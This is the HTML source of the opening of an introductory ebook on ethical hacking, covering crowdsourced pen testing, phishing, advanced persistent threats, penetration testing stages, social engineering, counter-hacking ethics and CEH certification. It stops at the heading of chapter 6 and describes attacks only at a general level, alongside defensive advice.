@@ -1,0 +1,1803 @@
+<p><span id="c001.xhtml"></span></p>
+<p>Copyright © 2019 by Adidas Wilson</p>
+<p>All rights reserved. No part of this publication may be reproduced, distributed, or transmitted in any form or by any means, including photocopying, recording, or other electronic or mechanical methods, without the prior written permission of the publisher, except in the case of brief quotations embodied in critical reviews and certain other noncommercial uses permitted by copyright law. For permission requests, write to the publisher, addressed “Attention: Permissions Coordinator,” at the address below.</p>
+<p>––––––––</p>
+<p>Adidas Wilson</p>
+<p>P.O. Box 2262</p>
+<p>Antioch, Tn. 37011</p>
+<p>siriusvisionstudios@gmail.com</p>
+<p>www.adidaswilson.com</p>
+<p><span id="toc.xhtml"></span></p>
+<h1>Table of Contents</h1>
+<p><a href="#c001.xhtml">Copyright Page</a></p>
+<p><a href="#c002.xhtml">Hacking Essentials - The Beginner's Guide To Ethical Hacking And Penetration Testing</a></p>
+<p><a href="#c003.xhtml">Table of Contents</a></p>
+<p><a href="#c004.xhtml">Introduction</a></p>
+<p><a href="#c005.xhtml">Chapter 1 | Phishing Attacks</a></p>
+<p><a href="#c006.xhtml">Chapter 2 | Advanced Persistent Threat (APT)</a></p>
+<p><a href="#c007.xhtml">Chapter 3 | Penetration Testing</a></p>
+<p><a href="#c008.xhtml">Chapter 4 | Counter-Hacking: Savior or Vigilante?</a></p>
+<p><a href="#c009.xhtml">Chapter 5 | Ethical Hacking</a></p>
+<p><a href="#c010.xhtml">Chapter 6 | Steps Hackers Take to Execute a Successful Cyber Attack</a></p>
+<p><a href="#c011.xhtml">Chapter 7 | Incident Response</a></p>
+<p><a href="#c012.xhtml">Chapter 8 | DNSSEC</a></p>
+<p><a href="#c013.xhtml">Chapter 9 | Reflected Cross Site Scripting (XSS) Attacks</a></p>
+<p><a href="#c014.xhtml">Chapter 10 | Intrusion Detection and Intrusion Prevention</a></p>
+<p><a href="#c015.xhtml">Chapter 11 | Ping Sweep</a></p>
+<p><a href="#c016.xhtml">Chapter 12 | Clickjacking</a></p>
+<p><a href="#c017.xhtml">Chapter 13 | Social Engineering</a></p>
+<p><a href="#c018.xhtml">Chapter 14 | PCI DSS</a></p>
+<p><a href="#c019.xhtml">Chapter 15 | Backdoor Attacks</a></p>
+<p><a href="#c020.xhtml">Chapter 16 | ISO/IEC 27001</a></p>
+<p><a href="#c021.xhtml">Chapter 17 | Malware Types</a></p>
+<p><a href="#c022.xhtml">Chapter 18 | Internet of Things Security</a></p>
+<p><a href="#c023.xhtml">Chapter 19 | Domain Name Server (DNS) Hijacking</a></p>
+<p><a href="#c024.xhtml">Chapter 20 | Cross Site Request Forgery (CSRF) Attack</a></p>
+<p><a href="#c025.xhtml">Chapter 21 | Structured Query Language (SQL) Injection</a></p>
+<p><a href="#c026.xhtml">Chapter 22 | DNS Spoofing</a></p>
+<p><a href="#c027.xhtml">Chapter 23 | Ethical Hacking Tools</a></p>
+<p><a href="#c028.xhtml">Chapter 24 | Web Scraping</a></p>
+<p><a href="#c029.xhtml">Chapter 25 | Man in the Middle (MITM) Attack</a></p>
+<p><a href="#c030.xhtml">Chapter 26 | Spear Phishing</a></p>
+<p><a href="#c031.xhtml">Chapter 27 | Rootkit</a></p>
+<p><a href="#c032.xhtml">Chapter 28 | Remote File Inclusion (RFI)</a></p>
+<p><a href="#c033.xhtml">Chapter 29 | Malvertising</a></p>
+<p><a href="#c034.xhtml">Chapter 30 | Vulnerability Assessment</a></p>
+<p><a href="#c035.xhtml">Chapter 31 | Zero-Day Exploit</a></p>
+<p><a href="#c036.xhtml">Chapter 32 | Vulnerability Management</a></p>
+<p><a href="#c037.xhtml">Chapter 33 | Web Application Security</a></p>
+<p><a href="#c038.xhtml">Conclusion</a></p>
+<p><a href="#c039.xhtml">References</a></p>
+<p><span id="c002.xhtml"></span></p>
+<p>Disclaimer</p>
+<p>––––––––</p>
+<div class="decoration-scene-break">
+<div class="decoration-scene-break-inner">
+<img src="d2d_images/scene_break.png" alt="image" class="decoration-scene-break" />
+</div>
+</div>
+<p><span class="first-scene-phrase"><span class="first-in-scene character-t">T</span>HE AUTHOR HAS MADE</span> every effort to ensure the accuracy of the information within this book was correct at time of publication. The author does not assume and hereby disclaims any liability to any party for any loss, damage, or disruption caused by errors or omissions, whether such errors or omissions result from accident, negligence, or any other cause.</p>
+<p><span id="c003.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Table of Contents</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>ntroduction</span></p>
+<p>Ch. 1 - Phishing Attacks</p>
+<p>Ch. 2 - Advanced Persistent Threat (APT)</p>
+<p>Ch. 3 - Penetration Testing</p>
+<p>Ch. 4 - Counter-Hacking: Savior or Vigilante?</p>
+<p>Ch. 5 - Ethical Hacking</p>
+<p>Ch. 6 - Steps Hackers Take to Execute a Successful Cyber Attack</p>
+<p>Ch. 7 - Incident Response</p>
+<p>Ch. 8 - DNSSEC</p>
+<p>Ch. 9 - Reflected Cross Site Scripting (XSS) Attacks</p>
+<p>Ch. 10 - Intrusion Detection and Intrusion Prevention</p>
+<p>Ch. 11 - Ping Sweep</p>
+<p>Ch. 12 – Clickjacking</p>
+<p>Ch. 13 - Social Engineering</p>
+<p>Ch. 14 - PCI DSS</p>
+<p>Ch. 15 - Backdoor Attacks</p>
+<p>Ch. 16 - ISO/IEC 27001</p>
+<p>Ch. 17 - Malware Types</p>
+<p>Ch. 18 - Internet of Things Security</p>
+<p>Ch. 19 - Domain Name Server (DNS) Hijacking</p>
+<p>Ch. 20 - Cross Site Request Forgery (CSRF) Attack</p>
+<p>Ch. 21 - Structured Query Language (SQL) Injection</p>
+<p>Ch. 22 - DNS Spoofing</p>
+<p>Ch. 23 - Ethical Hacking Tools</p>
+<p>Ch. 24 - Web Scraping</p>
+<p>Ch. 25 - Man in the Middle (MITM) Attack</p>
+<p>Ch. 26 - Spear Phishing</p>
+<p>Ch. 27 – Rootkit</p>
+<p>Ch. 28 - Remote File Inclusion (RFI)</p>
+<p>Ch. 29 – Malvertising</p>
+<p>Ch. 30 - Vulnerability Assessment</p>
+<p>Ch. 31 - Zero-Day Exploit</p>
+<p>Ch. 32 - Vulnerability Management</p>
+<p>Ch. 33 - Web Application Security</p>
+<p>Conclusion</p>
+<p><span id="c004.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Introduction</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-o">O</span>ne effective way of</span> ensuring that your IT infrastructure, services, and applications are secure is by asking a freelance white hat hacker to hack it. Whether you like it or not, hackers will penetrate your system, so it will benefit you to be a part of the process in order to tie up loose ends. Unfortunately, many companies do not have enough resources for penetration testing. Crowdsourcing is a great option for small companies that need this service at a lower price. You can get the talent you need at the right time—and at an affordable price. When you do not personally know the players, you are at risk of having someone who is not as experienced as they claim or one who will not do the job well. The biggest risk is that they will keep the information they gather and use it later. Fortunately, there are trusted firms that act as intermediaries between you and the hackers. They connect you with a skilled, vetted hacker, and offer the framework and program, at a fee. Some of the biggest and most common crowdsourcing companies include HackerOne, Bugcrowd, and Synack. These companies, and others like them, offer three main services:</p>
+<div class="poetry">
+<p>●  Bug bounty programs</p>
+<p>●  Penetration testing</p>
+<p>●  Vulnerability disclosure</p>
+</div>
+<p>Vulnerability Disclosure involves the customer creating and publishing a vulnerability disclosure program. It defines how and where hackers can contact the intermediary or customer with newly discovered bugs. Included are the expectations and responsibilities of the hacker, the intermediary, and the customer. There are hackers who have been known to irresponsibly disclose their findings to the public before they gave the vendor a chance to patch up the vulnerabilities. However, they only did that because they were frustrated by the company’s unreasonable response. Penetration testing is the service that generates the most money for crowdsourcing businesses. They connect a customer with a group of highly skilled hackers at a certain price for a specific scope of work. Most hackers that work with these companies do it part-time—not many of them do it full-time. The amount of money that a crowdsourced hacker can make on a single job depends on the kind of job they get selected for, experience, and skill set. Some hackers do it voluntarily to secure the government resources of their country while others give their earnings to charity. Bug bounty firms can save you a lot of money and time. All hacker-reported bugs are not easily reproducible or a threat to security. Bug bounty program vendors tell you the reported bugs that you need to fix. Their job is to figure out which bugs are real. It does not matter how good your IT security team is, companies should require a bug bounty program. Depending on the duration of the project, amount of work experience, and level of the hackers, this may cost you anywhere from a few thousand dollars to tens of thousands of dollars. Determine your budget and the type of services you want done. If you are sure crowdsourcing is necessary, talk to a firm that will manage the process for you and remove much of the risk.</p>
+<p><span id="c005.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 1</h1>
+<h1>Phishing Attacks</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-p">P</span>hishing is a social</span> engineering attack. In most cases, it is used to access and steal user data such as credit card numbers and login credentials. This kind of attack occurs when an intruder masquerades as a trusted party and deceives the victim into opening a text message, instant message, or email. Next, the victim is duped into clicking a link which allows the attacker to freeze the system or install malware. This kind of attack can be damaging and may lead to identity theft, stealing of funds, and unauthorized purchases. In governmental or corporate networks, phishing grants the intruder a foothold and opens the door for a larger attack like an APT (advanced persistent threat). In an APT, the organization can suffer substantial financial losses among many other damages. Phishing attack examples can be emails like for example <span style="font-style: italic">myuniversity.edu</span> which may be sent out too faculty members. The email tells the recipient that their user password is going to expire in a short time. Instructions will be included, guiding the user to go to <span style="font-style: italic">myuniversity.edu/renewal</span> so they can renew their password. When the recipient clicks the clink, a few things may happen: They may be redirected to a bogus page, <span style="font-style: italic">myuniversity.edurenewal.com</span>, which is very similar to the actual renewal page. The user is asked to enter the old and new password. The attacker monitors the page and gets the original password which will give them access to the university network. The link may redirect the user to the real password renewal page. During the redirection process, the infiltrator activates a malicious script in the background, hijacking the session cookie of the user. The result is a reflected XSS attack that gives the attacker access to privileged information. Email phishing scams are a numbers game. The fraudulent message is sent to a huge number of recipients, so even if only a small percentage of the recipients fall for this scam, the attacker will still gather a lot of information. Intruders have techniques to give them high success rates. They make sure the phishing message looks a lot like an actual email from the targeted information. They create a sense of urgency to push the recipients into action. The links included in the messages look like the legitimate links. Spear phishing is not aimed at random people; it targets a specific enterprise or person. It is an advanced version of phishing and special knowledge about the organization is required. When an attacker gets valid login credentials, they may successfully carry out a first stage APT. To protect an organization from phishing attacks, both the enterprise and users need to take precautionary measures: Users need to be vigilant. Any spoofed message has little mistakes that will expose it. Enterprises should follow several steps to reduce both spear phishing and phishing attacks: Establish a two-factor authentication (2FA). This method requires an extra step of verification from users when they are accessing sensitive information. In addition to 2FA, companies should have strict password management policies. Employees should change their passwords regularly and use different passwords for different applications. The enterprise should organize educational campaigns.</p>
+<p><span id="c006.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 2</h1>
+<h1>Advanced Persistent Threat (APT)</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span>n APT is a broad term</span>. It describes an attack campaign by an intruder, where they establish a malicious, long-term presence on a network with the aim of mining sensitive data. The intruder or team of intruders carefully search and pick their targets, usually government networks or large corporations. These intrusions can cause a lot of damage, including:</p>
+<div class="poetry">
+<p>●  Theft of intellectual property</p>
+<p>●  Compromise of sensitive information</p>
+<p>●  Total takeover of sites</p>
+<p>●  Sabotaging of critical infrastructure</p>
+</div>
+<p>APT attacks are a little different from traditional web application attacks in that:</p>
+<div class="poetry">
+<p>●  They are executed manually</p>
+<p>●  They are way more complex</p>
+<p>●  They are never hit-and-run attacks</p>
+<p>●  Their goal is usually to penetrate an entire network</p>
+</div>
+<p>APT Progression</p>
+<p>A successful advanced persistent threat happens in three stages: In most cases, enterprises are infiltrated via the compromising of one of the following: authorized human users, network resources, or web assets. This can be achieved through social engineering attacks such as spear phishing or malicious uploads such an SQL injection. Moreover, intruders can execute a DDoS attack simultaneously against the target. This distracts the network personnel and weakens the security perimeter. As soon as the initial access has been achieved, the infiltrators install a backdoor shell. This malware gives them network access and remote control. Once they have established a foothold, they spread their presence. They move up the hierarchy of the organization and compromise staff members by accessing very sensitive data. In this process, they gather the business’ critical information such as financial records, employee data and product line information.</p>
+<p>They can sell this information to competitors or sabotage the product line and destroy the company. During the APT event, the thieves store the stolen data somewhere within the network they are assaulting, in a secure place. After they have collected enough data, they extract it quietly without being noticed. Your security team is distracted using white noises as the information is being extracted. The best way to block the extraction of stolen data and prevent the installation of backdoors is monitoring egress and ingress traffic. Make a habit of inspecting traffic in your network perimeter so any unusual behavior does not go unnoticed. Deploy a web application firewall on your network perimeter to help filter the traffic being driven to your web application servers. Network firewalls and other internal traffic monitoring services can also help. Whitelisting controls the domains that are accessible from your network and the applications that users can install. It reduces the attack surfaces that are available to intruders. This security measure is not foolproof. To make it more effective, always have strict updated policies so that your users run updated versions of your applications. Your employees are the largest and the most susceptible soft-spot. There are three categories of targets:</p>
+<div class="poetry">
+<p>●  Careless users</p>
+<p>●  Malicious insiders</p>
+<p>●  Compromised users</p>
+</div>
+<p>Carefully review all your employees and the information that they have access to. Always patch any OS and software network vulnerabilities as soon as they are uncovered. Encrypt remote connections so that intruders do not use them to access your network. Filter incoming emails. This prevents phishing attacks and spam.</p>
+<p>Log security events immediately to improve whitelists and any other policies.</p>
+<p><span id="c007.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 3</h1>
+<h1>Penetration Testing</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span> penetration test</span> is sometimes referred to as a pen test. It is a cyberattack that is simulated against your PC system to see if there are any exploitable vulnerabilities. In web application security, a pen test is usually used to increase a WAF (web application firewall). Penetration testing sometimes involves an attempted breaching of several application systems such as frontend/backend servers and application protocol interfaces (APIs) to check for susceptibilities; for instance, unsensitized inputs which are at risk of code injection attacks. The insights that a penetration test provide can be helpful in patching the detected vulnerabilities and enhancing your WAF security policies. The process of pen testing can be divided into five stages: Planning and Reconnaissance determines the scope and goals of the test are defined, including the method of testing to be used and the systems that should be addressed. Intelligence is gathered (e.g. domain names, network, mail server) to help understand a target better and any potential vulnerabilities. The second step involves understanding how a target application will behave when different intrusion attempts are made. This is achieved using: Static analysis: an application’s code is inspected to make a rough guess on its behavior when it is running. The tools can entirely scan a code in one pass. Dynamic analysis: the application’s code is inspected in a running state. This method of scanning is more practical, since it gives a real-time view of how an application performs. Gaining Access, such as web application attacks such as backdoors, SQL injection and cross-site scripting are used to unravel the vulnerabilities of the target. Testers try exploiting these susceptibilities, usually by stealing data, escalating privileges, intercepting traffic, and other actions to understand how much damage they can cause. Maintaining access aims at seeing whether the susceptibility can be used to maintain a presence in the target—and maybe give the bad actor enough time to access in-depth data. The idea here is to imitate advanced threats that are persistent; they stay in a system for a long time, so they can access an organization’s sensitive data. The findings of the penetration test are made into a report detailing:</p>
+<div class="blockquote">
+<p>●  The uncovered vulnerabilities</p>
+<p>●  Any sensitive data that the bad actor accessed</p>
+<p>●  The length of time that the tester managed to remain in the system without being detected.</p>
+</div>
+<p>The security personnel analyses this information to help them configure the WAF settings of an enterprise and apply any other security solutions in order to patch the uncovered susceptibilities and prevent any future attacks. External pen tests are carried out on the company’s assets that can be seen on the internet such as company website, web application, email, etc. An internal test simulates an attack by a malevolent insider. The only information the tester is given is the enterprise’s name is called Blind Testing. The security personnel will, then, see how an actual attack would play out. Double Blind Testing, the security personnel are not notified of the attack. In Targeted Testing, the security personnel and the tester work together, notifying each other on their movements. What Is Social Engineering? Manipulating someone so they can reveal confidential information is what is referred to as social engineering. The perpetrators could be seeking any kind of information, but they mostly go for login credentials and bank information.</p>
+<p>How a Social Engineering Attack Looks Like</p>
+<p>Email from a Friend</p>
+<p>A criminal can socially engineer or hack one person’s email password and gain access to their contact list and probably their social networking contacts. The attacker then sends out an email to the victim’s contacts or posts a message on their social media page.</p>
+<p>These messages usually:</p>
+<p>Contain a link: thinking that the email is coming from a friend, you may not think twice about clicking on it. When you do this, the criminal can gain control of your computer by installing a malicious software.</p>
+<p>Contain a download: it could be a picture, document or video with a virus embedded.</p>
+<p>Email from Another Trusted Party</p>
+<p>A phishing attack is a type of a social engineering attack. It imitates a trusted party and manipulates you with a logical reason to give up sensitive data or your login credentials. These messages use a compelling pretext or story to: Ask for help urgently: they tell a sob story and ask for some money. Make a phishing attempt: you may receive an email or message that seems to come from your bank or another legitimate source. Ask for a donation for a charitable fundraiser: they take advantage of your kindness and generosity. Ask you to verify your credentials: they include a link that directs you to a fake site that looks real. Tell you that you are the winner of some lottery or something similar: they ask for personal financial information so they can “send” you the money. Pose as your coworker or boss: they may ask you to give them an update on some project then ask for confidential information.</p>
+<p>Baiting Scenarios</p>
+<p>These schemes are aware of the things that people want and they use those as bait. They are packaged as amazing deals (and there is usually a good rating to show you that the seller is trustworthy). Taking this bait may see you lose control over your computer or worse, lose all the money in your bank account.</p>
+<p>Response to a Query You Never Asked</p>
+<p>The attacker may pretend to have a solution to a question that you asked. They usually pose as companies used by millions of people. They send this message to as many people as possible. Those that do not use the services of that company will ignore the message but those that are customers are likely to take the bait. This type of social engineering attack is carried out by criminals who are out to wreak havoc. They hack the victim’s account (most likely a social media account) and cause drama.</p>
+<p>Do Not Be a Victim</p>
+<p>Tips to Remember</p>
+<div class="poetry">
+<p>●  Slow down even when the message seems urgent.</p>
+<p>●  Research the facts.</p>
+<p>●  Do not follow the link. Use a search engine to look for the real site.</p>
+<p>●  Email hijacking is common.</p>
+<p>●  Avoid suspicious downloads.</p>
+<p>●  Foreigners offers are not real.</p>
+</div>
+<p>How to Protect Yourself</p>
+<div class="poetry">
+<p>●  Delete requests asking for passwords and financial information.</p>
+<p>●  Ignore requests for help.</p>
+<p>●  Spam filters should be set to high.</p>
+<p>●  Secure your electronic devices.</p>
+</div>
+<p><span id="c008.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 4</h1>
+<h1>Counter-Hacking: Savior or Vigilante?</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-w">W</span>hen a new worm or</span> virus attacks, system administrators and users are usually caught by surprise.  But, is it okay for system administrators and users to continue having the same threats go undetected a year or two later? Should a significant size of the bandwidth on your ISP and the internet keep on being eaten up by worm traffic and viruses which can be easily prevented?  Many of the recent worms and viruses have aimed their attacks at vulnerabilities that already have patches available even months prior. If the administrators and users would patch up the susceptibilities in time, the virus would not be a threat to their systems at all. Another thing, when there is a new threat around OS and antivirus vendors come up with updates and patches to cover any vulnerabilities or detect and remove the threat, all users should take the necessary measures to protect their systems and the rest of the internet community.  But what if a user is ignorant or chooses not to take any necessary actions to keep the threat at bay, and propagates the infection; should the community respond? According to many people, it is ethically and morally wrong. It is considered vigilantism. People who stand for this point believe that retaliating and taking the matter into your own hands makes you just as bad as the original threat, legally speaking. There was the W32/Fizzer@MM worm that was spreading around the internet recently. Some operators decided to write code in order to disable the worm automatically. This code was removed to allow for further investigations on the legalities of a strategy like this. Should it be legalized? In a case like the one above, any uninfected machine will not be affected. The operators did not create an anti-worm but something more of a “vaccine” code and it was on a site that was already infected by the worm. Only the people who had infected devices would want to connect to the site. Even if the owners of these devices were ignorant of the worm, the operators were still doing them service by cleaning up their devices, right? This action can be defined as self-defense but in this situation, there is the case of users who do not even know that they are infected. When an unprotected user is infected, the entire internet is at risk. Although a user like this one has sovereignty over their device, they do not have sovereignty over the rest of the internet. There should be guidelines that every user is subjected to when they connect to the internet.  Unlike in real life, there is no internet police force. There should, however, be an organization or several of them with the authority to come up with virus vaccines or counter-worms. They will be looking for infected computers and try to clean them up. Invading someone’s computer in attempt to clean it is not any worse than the worm than the worm or virus that attacked the device in the first place, ethically speaking.  This is a slippery slope and counter-hacking is a gray area between sinking to the level of the malicious developer and reasonable self-defense.</p>
+<p><span id="c009.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 5</h1>
+<h1>Ethical Hacking</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-a">A</span>n ethical hacker,</span> also known as a white hat hacker, is an IT security expert with the same skill set as a malicious hacker (black hat hacker). They use the same technology as the black hat hacker to unravel weaknesses and vulnerabilities in companies’ systems. A malicious hacker does not obtain the consent of the victims before he operates, and he does so to cause damage, gain fame, or make money. An ethical hacker, on the other hand, is asked by an organization to hack the same organization’s systems to see if there are any security gaps that can be used by a black hat hacker. The first-time people tried to hack into computer systems was back in the ‘60s. Sometime in the ‘70s, companies and governments created “tiger teams”. Their job was to look for any vulnerabilities in the computing and telecom systems—they were the first white hat hackers. In the ‘80s and ‘90s, more people obtained personal computers, and this made hacking a global phenomenon. The term “ethical hacking” was coined by John Patrick in 1995. After some time, ethical hacking became a legitimate profession.</p>
+<p>Certified Ethical Hacker (CEH) Certification</p>
+<p>Having a certification as an ethical hacker is very important. Before an organization employs a white hat hacker, they need to make sure that the hacker is technically skilled and will use their skills for good of the company and not cause any damages. The Certified Ethical Hacker certification was defined by a non-profit organization in New Mexico, known as the Electronic Commerce Council (EC-Council). This certification legitimizes information security professionals and allows them to be recognized as ethical hackers. This certification is very demanding. It covers a myriad of security tools, attack vectors, and concepts that every student must understand in depth. There are many organizations that accredit it, among them the US Department of Defense and the National Security Agency (NSA). To qualify as a certified hacker, a student must pass the CEH exam. In preparation for the exam:</p>
+<div class="blockquote">
+<p>●  A student can take the CEH training program offered by the EC-Council. The three Accredited Training Centers include Affinity IT Security, Pearson Vue Testing Center and EC-Council.</p>
+<p>●  The EC-Council offers a CEH Exam Blueprint and a CEH Handbook on their website.</p>
+<p>●  Several organizations offer prep courses.</p>
+<p>●  The EC-Council encourages candidates to take practice tests.</p>
+</div>
+<p>To be able to take the CEH exam, a candidate must complete the training program offered by EC-Council and prove to be experienced in not less than 3 of the 5 domains. Alternatively, they need to have two years of experience in the field of information security. Web applications are a key target for hackers. They are vulnerable because of their complicated multi-tier architecture. They also store sensitive data and can be easily accessed from outside. Certified hackers have a wide understanding of modern attack technologies, threat vectors, and software systems. They can use this knowledge to help companies understand their web applications’ security posture, the level of threat, and how they can improve their security.</p>
+<p><span id="c010.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 6</h1>
+<h1>Steps Hackers Take to Execute a Successful Cyber Attack</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
